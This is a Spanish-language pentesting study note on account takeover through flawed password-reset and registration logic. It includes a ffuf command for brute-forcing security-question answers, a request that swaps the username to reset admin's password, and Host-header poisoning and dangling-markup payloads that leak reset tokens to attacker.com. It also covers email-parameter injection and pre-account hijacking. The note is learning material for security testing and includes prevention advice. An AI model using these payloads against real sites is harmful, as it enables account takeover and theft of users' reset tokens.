---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Authentication
Descripción: "Forzar el token ataca su valor. Pero aunque el token sea fuerte y haya rate limiting, la lógica del flujo de reset suele estar rota — y un fallo de lógica vale un account…"
Fecha de actualización: 2026-06-23
Nota previa: "[[06 - Credenciales por defecto]]"
Nota siguiente: "[[08 - Bypass de autenticación - acceso directo]]"
Area: "[[Authentication.base|Authentication]]"
---
---

[[03 - Fuerza bruta de tokens de reset|Forzar el token]] ataca su **valor**. Pero aunque el token sea fuerte y haya rate limiting, la **lógica** del flujo de reset suele estar rota — y un fallo de lógica vale un account takeover completo sin adivinar nada. Es uno de los terrenos más productivos en bug bounty.

# Preguntas de seguridad adivinables

Cuando el reset se apoya en preguntas de seguridad predefinidas ("¿en qué ciudad naciste?", "apellido de soltera de tu madre"), <mark style="background: #FFB8EBA6;">la respuesta es OSINT o fuerza bruta</mark>: el espacio es pequeño y las respuestas, públicas. Una wordlist de ciudades del mundo (~26.000) fuerza la respuesta si no hay protección:

```shell-session
$ cut -d ',' -f1 world-cities.csv > cities.txt
$ ffuf -w cities.txt -u http://target/security_question.php -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "PHPSESSID=<sesión>" -d "security_response=FUZZ" -fr "Incorrect response"
[Status: 302] FUZZ: Houston
```

Con un dato de OSINT (nacionalidad) recortas el espacio: `grep Germany world-cities.csv | cut -d, -f1` → ~1.100 ciudades.

# Manipulación del parámetro de usuario

El fallo de lógica más jugoso. Si el flujo arrastra el `username`/`email` como parámetro y <mark style="background: #FF5582A6;">no verifica que sea el **mismo** en todos los pasos</mark>, cambias la víctima en la petición final. Pasas tu propia pregunta de seguridad (o el paso que sea) con tu cuenta, y en el POST que fija la contraseña sustituyes el usuario:

```http
POST /reset_password.php HTTP/1.1
Cookie: PHPSESSID=<tu_sesión_validada>

password=P@$$w0rd&username=admin      ← tu sesión, pero cambias la contraseña de admin
```

<mark style="background: #8000E1A6;">Es un IDOR sobre el flujo de reset</mark>: el backend confía en un parámetro controlable en lugar de en el estado de la sesión. Prevención: mantener el estado del reset atado a la sesión/token server-side durante todo el proceso, nunca a un parámetro del cliente. Relacionado con [[09 - Bypass de autenticación - modificación de parámetros]].

# Lo que HTB omite: los ATO clásicos de bug bounty

Tres técnicas que dominan los reportes de account takeover por reset:

- <mark style="background: #FFB86CA6;">**Host header poisoning**</mark> (*password reset poisoning*): si la app construye el enlace de reset usando la cabecera `Host` (o `X-Forwarded-Host`) de la petición, la cambias por tu dominio. El correo le llega a la víctima con un enlace a `attacker.com/reset?token=...`; cuando hace clic, **su token válido viaja a tu servidor**.

```http
POST /forgot_password HTTP/1.1
Host: attacker.com            ← el enlace del email apunta aquí, con el token de la víctima
email=victim@target.com
```

- **Fuga del token por `Referer`**: si la página de reset (con el token en la URL) carga recursos de terceros (analytics, CDN), el token se filtra en la cabecera `Referer` hacia esos dominios. Lo recoges de tus logs si controlas alguno.
- **Dangling markup**: si el `Host` (o un parámetro) se refleja **sin escapar** dentro del HTML del correo de reset, inyectar markup colgante (`'><img src='//attacker.com/?`) hace que el navegador de la víctima filtre el token —y todo lo que siga hasta la próxima comilla— a tu servidor. Más fiable que el `Referer` porque no depende de recursos de terceros.
- **Inyección de email / segundo destinatario**: si el campo acepta un array o una segunda dirección (`email=victim@target.com&email=attacker@evil.com`, o `email=victim@target.com,attacker@evil.com`), el enlace de reset se envía **también** a ti.

# Account takeover en el registro: pre-hijacking

El reset no es el único flujo que regala cuentas. El **pre-account hijacking** (Sudhodanan & Paverd, USENIX 2022 — 35 de 75 sitios top vulnerables) ataca el **registro**:

- <mark style="background: #FFB86CA6;">**Pre-hijacking clásico**</mark>: el atacante crea la cuenta con el **email de la víctima** *antes* que ella. Cuando la víctima se registra después vía SSO/OAuth y el servicio **fusiona por email no verificado**, ambos comparten acceso a la misma cuenta.
- **Confusión de email**: normalización Unicode o de mayúsculas (`Victim@x.com` vs `victim@x.com`), `+alias`, o los puntos de Gmail (`v.ictim@`) → registras una variante que colisiona con la cuenta de la víctima al verificarse.

La raíz es la misma que en el reset: <mark style="background: #FF5582A6;">confiar en un identificador (el email) sin verificarlo antes de tomar decisiones de seguridad</mark>. Probar el registro con el email de una cuenta existente es un test estándar de ATO.

> [!important]+ Metodología de reset
> Mapea el flujo completo con [[02 - Interceptación de peticiones|Burp]] antes de tocar nada: cuántos pasos, qué parámetros viajan, dónde está el token, qué cabeceras se reflejan en el correo. Los fallos de lógica viven en las **costuras** entre pasos — donde el estado debería persistir server-side pero se confía a un parámetro del cliente o a una cabecera.

> [!info]+ Fuentes
> - [PortSwigger — Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) · [How to identify and exploit it](https://portswigger.net/web-security/host-header)
> - [OWASP — Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
> - [Pre-hijacking attacks (Sudhodanan & Paverd, USENIX Security 2022)](https://www.usenix.org/conference/usenixsecurity22/presentation/sudhodanan) · [MSRC](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
